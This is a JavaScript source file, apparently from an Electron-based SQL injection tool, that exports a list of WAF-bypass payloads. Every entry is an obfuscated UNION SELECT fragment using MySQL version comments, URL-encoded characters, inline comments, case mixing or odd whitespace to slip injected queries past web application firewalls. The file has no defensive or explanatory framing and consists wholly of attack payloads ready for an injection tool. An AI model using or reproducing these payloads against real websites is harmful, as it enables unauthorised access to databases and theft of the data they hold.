// 📁 sqli-electron-gui/wafPayloads.js
const wafPayloads = [
  "+union%0Aselect+",
  "+union+distinctROW+select+",
  "/*!12345UNION+SELECT*/",
  "/**//*!50000UNION+SELECT*//**/",
  "/**/UNION/**//*!50000SELECT*//**/",
  "/*!50000UniON+SeLeCt*/",
  "union+/*!50000%53elect*/",
  "+‪#union+‪#select",
  "+‪#1q%0AuNiOn+all#qa%0A#%0AsEleCt",
  "/*!%55NiOn*/+/*!%53eLEct*/",
  "/*!u%6eion*//*!se%6cect*/",
  "+un/**/ion+se/**/lect",
  "uni%0bon+se%0blect",
  "%2f**%2funion%2f**%2fselect",
  "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A",
  "REVERSE(noinu)+REVERSE(tceles)",
  "/*--*/union/*--*/select/*--*/",
  "union(/*!/**/SeleCT+*/+$colom)",
  "/*!union*/+/*!select*/",
  "union+/*!select*/",
  "/**/union/**/select/**/",
  "/**/uNIon/**/sEleCt/**/",
  "/**//*!union*//**//*!select*//**/",
  "/*!uNIOn*//*!SelECt*/",
  "+union+distinct+select+",
  "+union+distinctROW+select+",
  "uNiOn+aLl+sElEcT"
];

module.exports = wafPayloads;
